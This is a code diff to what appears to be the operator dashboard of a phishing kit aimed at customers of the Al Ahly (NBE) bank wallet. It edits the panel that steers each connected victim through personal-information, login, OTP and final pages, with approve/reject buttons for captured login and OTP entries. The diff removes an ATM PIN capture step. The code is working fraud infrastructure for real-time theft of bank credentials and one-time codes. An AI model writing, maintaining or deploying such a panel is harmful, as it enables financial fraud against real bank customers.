@@ -1976,7 +1976,6 @@
       html += '<option value="personal-info">المعلومات الشخصية</option>';
       html += '<option value="wallet-login">تسجيل الدخول</option>';
       html += '<option value="otp-nbe">رمز التحقق OTP</option>';
-      html += '<option value="atm-nbe">رمز ATM</option>';
       html += '<option value="final-nbe">الصفحة النهائية</option>';
       html += '</optgroup>';
       html += '</select>';
@@ -2506,7 +2505,7 @@
             }
             
             // إضافة أزرار موافقة/رفض لصفحات محفظة الأهلي
-            if (dataEntry.page === 'تسجيل الدخول - محفظة الأهلي' || dataEntry.page === 'رمز التحقق - محفظة الأهلي' || dataEntry.page === 'رمز ATM - محفظة الأهلي') {
+            if (dataEntry.page === 'تسجيل الدخول - محفظة الأهلي' || dataEntry.page === 'رمز التحقق - محفظة الأهلي') {
               html += '<div class="flex gap-2 mt-3">';
               html += '<button onclick="nbeApproveAction(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
               html += '<button onclick="nbeRejectAction(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
@@ -2609,7 +2608,6 @@
       html += '<option value="personal-info">المعلومات الشخصية</option>';
       html += '<option value="wallet-login">تسجيل الدخول</option>';
       html += '<option value="otp-nbe">رمز التحقق OTP</option>';
-      html += '<option value="atm-nbe">رمز ATM</option>';
       html += '<option value="final-nbe">الصفحة النهائية</option>';
       html += '</optgroup>';
       html += '</select>';
